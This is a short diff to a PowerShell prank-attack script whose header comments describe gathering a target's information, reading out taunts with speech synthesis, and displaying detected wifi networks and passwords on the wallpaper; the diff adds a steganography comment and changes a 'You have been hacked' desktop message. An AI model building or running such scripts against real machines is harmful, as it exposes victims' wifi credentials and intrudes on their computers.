@@ -28,6 +28,7 @@
 	Once the information is gathered the script will pause until a mouse movement is detected
 	Then the script uses Sapi speak to roast their set up and lack of security
 	If wifi networks and passwords are detected wallpaper will be changed to image displaying that information
+	Image generated will be saved to desktop, steganography is used to put hidden message at bottom of binary output of image generated
 #>
 ############################################################################################################################################################
 
@@ -682,7 +683,7 @@ $s.Speak($OUTRO)
 
 # this snippet will leave a message on your targets desktop 
 
-$message = "`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back"
+$message = "`You have been hacked, with love -Jakoby"
 
 Add-Content $home\Desktop\WithLove.txt $message
 ###########################################################################################################
